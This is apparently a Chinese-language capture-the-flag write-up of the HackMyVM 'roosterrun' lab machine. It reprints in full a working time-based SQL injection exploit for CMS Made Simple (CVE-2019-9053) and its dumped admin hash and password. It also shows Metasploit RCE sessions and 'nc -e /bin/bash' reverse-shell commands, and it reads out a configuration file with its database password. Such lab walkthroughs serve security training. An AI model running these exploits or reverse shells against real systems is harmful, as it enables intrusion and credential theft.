---
title: roosterrun
author: hgbe02
date: 2024-04-05
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/roosterrun.html"
---

# roosterrun

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840349.png" alt="image-20240405124215450" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
rustscan -a 172.20.10.3 -- -A
```

```css
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL4gbzUOgWlMW/HgWpBe3FlvvdyW1IsS+o1NK/YbUOoM3iokvdbkFxXdYjyvzkNpvpCXfldEQwS+BIfEmdtwU=
|   256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0o8/EYPi0jQMqY1zqXqlKfugpCtjg0i5m3bzbyfqxt
80/tcp open  http    syn-ack Apache httpd 2.4.57 ((Debian))
|_http-title: Home - Blog
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 551E34ACF2930BF083670FA203420993
|_http-generator: CMS Made Simple - Copyright (C) 2004-2023. All rights reserved.
|_http-server-header: Apache/2.4.57 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```
gobuster dir -u http://172.20.10.3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```css
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.3
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/modules              (Status: 301) [Size: 312] [--> http://172.20.10.3/modules/]
/uploads              (Status: 301) [Size: 312] [--> http://172.20.10.3/uploads/]
/doc                  (Status: 301) [Size: 308] [--> http://172.20.10.3/doc/]
/admin                (Status: 301) [Size: 310] [--> http://172.20.10.3/admin/]
/assets               (Status: 301) [Size: 311] [--> http://172.20.10.3/assets/]
/lib                  (Status: 301) [Size: 308] [--> http://172.20.10.3/lib/]
/tmp                  (Status: 301) [Size: 308] [--> http://172.20.10.3/tmp/]
/server-status        (Status: 403) [Size: 276]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

```bash
feroxbuster -u http://172.20.10.3 -s 200,300-399 -d 3
```

```css
200      GET        1l       20w     3039c http://172.20.10.3/uploads/simplex/js/functions.min.js
200      GET       13l       92w     6618c http://172.20.10.3/uploads/simplex/images/icons/cmsms-60x60.png
200      GET       22l      119w     8605c http://172.20.10.3/uploads/simplex/images/icons/cmsms-76x76.png
200      GET        2l       32w      310c http://172.20.10.3/tmp/cache/stylesheet_combined_0d2fdbf99188c55873e2137f35485fe3.css
200      GET        7l       46w     3241c http://172.20.10.3/uploads/simplex/images/cmsmadesimple-logo.png
200      GET      146l     1000w    77673c http://172.20.10.3/uploads/simplex/teaser/mate-zimple.png
200      GET       49l      292w    21539c http://172.20.10.3/uploads/simplex/images/icons/cmsms-196x196.png
200      GET       38l      234w    15357c http://172.20.10.3/uploads/simplex/images/icons/cmsms-120x120.png
200      GET       46l      244w    16140c http://172.20.10.3/uploads/simplex/teaser/palm-logo.png
200      GET       42l      274w    17352c http://172.20.10.3/uploads/simplex/images/icons/cmsms-152x152.png
200      GET        3l        6w     2634c http://172.20.10.3/uploads/simplex/images/icons/favicon_cms.ico
200      GET        6l     2820w    32881c http://172.20.10.3/tmp/cache/stylesheet_combined_f403e174ee7208ce2ba6ebba2191ed2e.css
200      GET      279l     2020w   159674c http://172.20.10.3/uploads/simplex/teaser/browser-scene.png
200      GET        4l     1412w    95786c http://172.20.10.3/lib/jquery/js/jquery-1.11.1.min.js
200      GET       26l      374w    26556c http://172.20.10.3/uploads/simplex/js/jquery.sequence-min.js
200      GET      310l     1844w   141324c http://172.20.10.3/uploads/simplex/teaser/mobile-devices-scene.png
200      GET      127l     1179w    19257c http://172.20.10.3/index.php
200      GET      127l     1179w    19257c http://172.20.10.3/
200      GET        1l        0w        2c http://172.20.10.3/uploads/simplex/
200      GET        0l        0w        0c http://172.20.10.3/tmp/cache/
200      GET        1l        1w        7c http://172.20.10.3/lib/phpmailer/VERSION
200      GET      504l     4372w    26421c http://172.20.10.3/lib/phpmailer/LICENSE
```

## 漏洞挖掘

### 踩点

```bash
whatweb http://172.20.10.3                             
http://172.20.10.3 [200 OK] Apache[2.4.57], CMS-Made-Simple[2.2.9.1], Cookies[CMSSESSIDa0ef49a94e6c], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[172.20.10.3], JQuery[1.11.1], MetaGenerator[CMS Made Simple - Copyright (C) 2004-2023. All rights reserved.], Script[text/javascript], Title[Home - Blog]

 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  CMS Scan Results  [+] 

 ┏━Target: 172.20.10.3
 ┃
 ┠── CMS: CMS Made Simple
 ┃    │
 ┃    ╰── URL: https://cmsmadesimple.org
 ┃
 ┠── Result: /home/kali/Result/172.20.10.3/cms.json
 ┃
 ┗━Scan Completed in 19.24 Seconds, using 1 Requests
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840350.png" alt="image-20240405124859718" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840351.png" alt="image-20240405124950988" style="zoom:50%;" />

随手查看一下是否有相关漏洞：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840352.png" alt="image-20240405125055122" style="zoom:50%;" />

接着看其他信息：

### 查看敏感目录

```apl
/uploads  /doc
```

存在，但是看不了。

```apl
/admin
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840353.png" alt="image-20240405130036275" style="zoom:50%;" />

### SQL注入

找到登录窗口，尝试弱密码以及万能密码，无果，尝试一下刚刚看到的那个sql注入：

```python
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053

import requests
from termcolor import colored
import time
from termcolor import cprint
import optparse
import hashlib

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)

options, args = parser.parse_args()
if not options.url:
    print "[+] Specify an url target"
    print "[+] Example usage (no cracking password): exploit.py -u http://target-uri"
    print "[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist"
    print "[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based."
    exit()

url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

salt = ''
wordlist = ""
if options.wordlist:
    wordlist += options.wordlist

def crack_password():
    global password
    global output
    global wordlist
    global salt
    dict = open(wordlist)
    for line in dict.readlines():
        line = line.replace("\n", "")
        beautify_print_try(line)
        if hashlib.md5(str(salt) + line).hexdigest() == password:
            output += "\n[+] Password cracked: " + line
            break
    dict.close()

def beautify_print_try(value):
    global output
    print "\033c"
    cprint(output,'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])

def beautify_print():
    global output
    print "\033c"
    cprint(output,'green', attrs=['bold'])

def dump_salt():
    global flag
    global salt
    global output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt

def dump_password():
    global flag
    global password
    global output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_password = password + dictionary[i]
            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_password)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password

def dump_username():
    global flag
    global db_name
    global output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True

def dump_email():
    global flag
    global email
    global output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_email = email + dictionary[i]
            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_email)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True

dump_salt()
dump_username()
dump_email()
dump_password()

if options.cracking:
    print colored("[*] Now try to crack password")
    crack_password()

beautify_print()          
```

利用sleep函数进行时间型盲注，运行一下这个脚本：

先安装一下库，这是个python2的脚本

```bash
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py  
python2 get-pip.py
python2 -m pip install --upgrade setuptools
python2 -m pip install termcolor 
```

```bash
python2 46635.py -u http://172.20.10.3
[+] Salt for password found: 1a0112229fbd699d
[+] Username found: admin
[+] Email found: admin@localhost.com
[+] Password found: 4f943036486b9ad48890b2efbf7735a8
```

登录进去：

```apl
admin 
4f943036486b9ad48890b2efbf7735a8
```

但是失败了。。。。。尝试加盐hash碰撞一下：

```bash
echo 'admin:4f943036486b9ad48890b2efbf7735a8$1a0112229fbd699d' > pass_hash
john -w=/usr/share/wordlists/rockyou.txt pass_hash 
```

时间稍微有点长，尝试了上面那个脚本提供的爆破方法：

```bash
python2 46635.py -u http://172.20.10.3 --crack -w /usr/share/wordlists/rockyou.txt
[+] Salt for password found: 1a0112229fbd699d
[+] Username found: admin
[+] Email found: admin@localhost.com
[+] Password found: 4f943036486b9ad48890b2efbf7735a8
[+] Password cracked: homeandaway
```

得到了密码！上面那个john没有爆破出来不知道咋回事。。。。。

### 登录进去看看

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840354.png" alt="image-20240405140827987" style="zoom:50%;" />

### metasploit RCE

寻找一下是否有RCE漏洞

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840355.png" alt="image-20240405141305296" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840356.png" alt="image-20240405141322366" style="zoom:33%;" />

似乎是`metasploit`的，去找找：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840357.png" alt="image-20240405141549313" style="zoom:50%;" />

（鸭子属实可爱，放进来）

#### cmsms_upload_rename_rce

我们上面 google 找到的是第三个，但是第二个比较稳定，尝试使用一下：

```bash
msf6 > search cms made simple

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/multi/http/cmsms_showtime2_rce         2019-03-11       normal     Yes    CMS Made Simple (CMSMS) Showtime2 File Upload RCE
   1  exploit/multi/http/cmsms_upload_rename_rce     2018-07-03       excellent  Yes    CMS Made Simple Authenticated RCE via File Upload/Copy
   2  exploit/multi/http/cmsms_object_injection_rce  2019-03-26       normal     Yes    CMS Made Simple Authenticated RCE via object injection


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/cmsms_object_injection_rce

msf6 > use 1
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/cmsms_upload_rename_rce) > show options

Module options (exploit/multi/http/cmsms_upload_rename_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /cmsms/          yes       Base cmsms directory path
   USERNAME                    yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.4         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/cmsms_upload_rename_rce) > set password homeandaway
password => homeandaway
msf6 exploit(multi/http/cmsms_upload_rename_rce) > set username admin
username => admin
msf6 exploit(multi/http/cmsms_upload_rename_rce) > set rhosts 172.20.10.3
rhosts => 172.20.10.3
msf6 exploit(multi/http/cmsms_upload_rename_rce) > set lhost 172.20.10.8
lhost => 172.20.10.8
msf6 exploit(multi/http/cmsms_upload_rename_rce) > show options

Module options (exploit/multi/http/cmsms_upload_rename_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   homeandaway      yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     172.20.10.3      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /cmsms/          yes       Base cmsms directory path
   USERNAME   admin            yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.20.10.8      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/cmsms_upload_rename_rce) > set targeturi /
targeturi => /
msf6 exploit(multi/http/cmsms_upload_rename_rce) > r
[-] Unknown command: r
msf6 exploit(multi/http/cmsms_upload_rename_rce) > run

[*] Started reverse TCP handler on 172.20.10.8:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Sending stage (39927 bytes) to 172.20.10.3
[+] Deleted ZVVOEfQY.php
[*] Meterpreter session 1 opened (172.20.10.8:4444 -> 172.20.10.3:52598) at 2024-04-05 03:02:53 -0400
whoami;id
[!] This exploit may require manual cleanup of 'ZVVOEfQY.txt' on the target

meterpreter > whoami;id
[-] Unknown command: whoami;id
meterpreter > ls
Listing: /var/www/html/uploads
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040755/rwxr-xr-x  4096  dir   2023-09-20 01:28:33 -0400  NCleanBlue
040755/rwxr-xr-x  4096  dir   2024-04-05 03:03:14 -0400  images
100644/rw-r--r--  0     fil   2023-09-20 01:28:33 -0400  index.html
040755/rwxr-xr-x  4096  dir   2023-09-20 01:28:33 -0400  ngrey
040755/rwxr-xr-x  4096  dir   2023-09-20 01:28:33 -0400  simplex

meterpreter > cd /tmp
meterpreter > shell
Process 3032 created.
Channel 0 created.
whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
script /dev/null -c bash                
Script started, output log file is '/dev/null'.
www-data@rooSter-Run:/tmp$ nc -e 172.20.10.8 1234
nc -e 172.20.10.8 1234
no port[s] to connect to
nc -e /bin/bash 172.20.10.8 1234
stty: 'standard input': Inappropriate ioctl for device
hostname: Name or service not known
bash: line 12: ifconfig: command not found
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840358.png" alt="image-20240405150906542" style="zoom: 50%;" />

尝试一下另一个我们找到的行不行：

#### cmsms_object_injection_rce

```bash
┌──(kali💀kali)-[~/temp/roosterrun]
└─$ msfconsole           
Metasploit tip: The use command supports fuzzy searching to try and 
select the intended module, e.g. use kerberos/get_ticket or use 
kerberos forge silver ticket
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.3.55-dev                          ]
+ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search cms made simple 

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/multi/http/cmsms_showtime2_rce         2019-03-11       normal     Yes    CMS Made Simple (CMSMS) Showtime2 File Upload RCE
   1  exploit/multi/http/cmsms_upload_rename_rce     2018-07-03       excellent  Yes    CMS Made Simple Authenticated RCE via File Upload/Copy
   2  exploit/multi/http/cmsms_object_injection_rce  2019-03-26       normal     Yes    CMS Made Simple Authenticated RCE via object injection


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/cmsms_object_injection_rce

msf6 > use 2
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/cmsms_object_injection_rce) > show options

Module options (exploit/multi/http/cmsms_object_injection_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base cmsms directory path
   USERNAME                    yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.4         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/cmsms_object_injection_rce) > set password homeandaway
password => homeandaway
msf6 exploit(multi/http/cmsms_object_injection_rce) > set username admin
username => admin
msf6 exploit(multi/http/cmsms_object_injection_rce) > set rhosts 172.20.10.3
rhosts => 172.20.10.3
msf6 exploit(multi/http/cmsms_object_injection_rce) > set lhost 172.20.10.8
lhost => 172.20.10.8
msf6 exploit(multi/http/cmsms_object_injection_rce) > show options

Module options (exploit/multi/http/cmsms_object_injection_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   homeandaway      yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     172.20.10.3      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base cmsms directory path
   USERNAME   admin            yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.20.10.8      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/cmsms_object_injection_rce) > exploit

[*] Started reverse TCP handler on 172.20.10.8:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Sending stage (39927 bytes) to 172.20.10.3
[+] Deleted TUcQplymn.php
[*] Meterpreter session 1 opened (172.20.10.8:4444 -> 172.20.10.3:37758) at 2024-04-05 03:12:25 -0400

meterpreter > cd /tmp
meterpreter > shell
Process 3244 created.
Channel 0 created.
whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
script /dev/null -c bash 
Script started, output log file is '/dev/null'.
www-data@rooSter-Run:/tmp$ nc -e bash 172.20.10.8 1234
nc -e bash 172.20.10.8 1234
exec bash failed : No such file or directory
www-data@rooSter-Run:/tmp$ nc -e /bin/bash 172.20.10.8 1234
nc -e /bin/bash 172.20.10.8 1234
(UNKNOWN) [172.20.10.8] 1234 (?) : Connection refused
www-data@rooSter-Run:/tmp$ nc -e /bin/bash 172.20.10.8 1234
nc -e /bin/bash 172.20.10.8 1234
script: unexpected number of arguments
Try 'script --help' for more information.
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404051840359.png" alt="image-20240405151709672" style="zoom:50%;" />

也是可以的！

## 提权

先改善一下环境问题：

```bash
script /dev/null -c bash
ctrl+z
stty raw -echo;fg
reset xterm
export XTERM=xterm-256color
stty rows 55 columns 209 
source /etc/skel/.bashrc
```

### 信息搜集

```bash
www-data@rooSter-Run:/tmp$ ls -la
ls -la
total 8
drwxrwxrwt  2 root root 4096 Apr  5 09:03 .
drwxr-xr-x 18 root root 4096 Jul 22  2023 ..
www-data@rooSter-Run:/tmp$ cd /var/   
cd /var/
www-data@rooSter-Run:/var$ ls -la
ls -la
total 48
drwxr-xr-x 12 root root  4096 Sep 20  2023 .
drwxr-xr-x 18 root root  4096 Jul 22  2023 ..
drwxr-xr-x  2 root root  4096 Apr  5 07:10 backups
drwxr-xr-x 11 root root  4096 Sep 20  2023 cache
drwxr-xr-x 27 root root  4096 Sep 20  2023 lib
drwxrwsr-x  2 root staff 4096 Mar  2  2023 local
lrwxrwxrwx  1 root root     9 Jun 15  2023 lock -> /run/lock
drwxr-xr-x  8 root root  4096 Apr  5 06:41 log
drwxrwsr-x  2 root mail  4096 Jun 15  2023 mail
drwxr-xr-x  2 root root  4096 Jun 15  2023 opt
lrwxrwxrwx  1 root root     4 Jun 15  2023 run -> /run
drwxr-xr-x  4 root root  4096 Jun 15  2023 spool
drwxrwxrwt  2 root root  4096 Apr  5 06:41 tmp
drwxr-xr-x  3 root root  4096 Sep 20  2023 www
www-data@rooSter-Run:/var$ mail
mail
bash: mail: command not found
www-data@rooSter-Run:/var$ cd www;ls -la
cd www;ls -la
total 12
drwxr-xr-x  3 root     root     4096 Sep 20  2023 .
drwxr-xr-x 12 root     root     4096 Sep 20  2023 ..
drwxr-xr-x  9 www-data www-data 4096 Sep 20  2023 html
www-data@rooSter-Run:/var/www$ cd html
cd html
www-data@rooSter-Run:/var/www/html$ ls -la
ls -la
total 60
drwxr-xr-x  9 www-data www-data  4096 Sep 20  2023 .
drwxr-xr-x  3 root     root      4096 Sep 20  2023 ..
drwxr-xr-x  6 www-data www-data  4096 Apr  5 09:12 admin
drwxr-xr-x  9 www-data www-data  4096 Sep 20  2023 assets
-r--r--r--  1 www-data www-data   384 Sep 20  2023 config.php
drwxr-xr-x  2 www-data www-data  4096 Sep 20  2023 doc
-rw-r--r--  1 www-data www-data  1150 Sep 20  2023 favicon_cms.ico
-rw-r--r--  1 www-data www-data 12050 Sep 20  2023 index.php
drwxr-xr-x 11 www-data www-data  4096 Sep 20  2023 lib
-rw-r--r--  1 www-data www-data   959 Sep 20  2023 moduleinterface.php
drwxr-xr-x 15 www-data www-data  4096 Sep 20  2023 modules
drwxr-xr-x  4 www-data www-data  4096 Sep 20  2023 tmp
drwxr-xr-x  6 www-data www-data  4096 Apr  5 09:03 uploads
www-data@rooSter-Run:/var/www/html$ cat config.php
cat config.php
<?php
# CMS Made Simple Configuration File
# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
#
$config['dbms'] = 'mysqli';
$config['db_hostname'] = 'localhost';
$config['db_username'] = 'admin';
$config['db_password'] = 'j42W9kDq9dN9hK';
$config['db_name'] = 'cmsms_db';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'Europe/Berlin';
?>www-data@rooSter-Run:/var/www/html$ cd doc;ls -la
cd doc;ls -la
total 100
drwxr-xr-x 2 www-data www-data  4096 Sep 20  2023 .
drwxr-xr-x 9 www-data www-data  4096 Sep 20  2023 ..
-rw-r--r-- 1 www-data www-data   418 Sep 20  2023 .htaccess
-rw-r--r-- 1 www-data www-data  4981 Sep 20  2023 AUTHORS.txt
-rw-r--r-- 1 www-data www-data 42369 Sep 20  2023 CHANGELOG.txt
-rw-r--r-- 1 www-data www-data 17992 Sep 20  2023 COPYING.txt
-rw-r--r-- 1 www-data www-data   920 Sep 20  2023 README.txt
-rw-r--r-- 1 www-data www-data  4045 Sep 20  2023 htaccess.txt
-rw-r--r-- 1 www-data www-data    24 Sep 20  2023 index.html
-rw-r--r-- 1 www-data www-data   121 Sep 20  2023 robots.txt
www-data@rooSter-Run:/var/www/html/doc$ cd /            
cd /
www-data@rooSter-Run:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
mysql:x:103:112:MySQL Server,,,:/nonexistent:/bin/false
matthieu:x:1000:1000:,,,:/home/matthieu:/bin/zsh
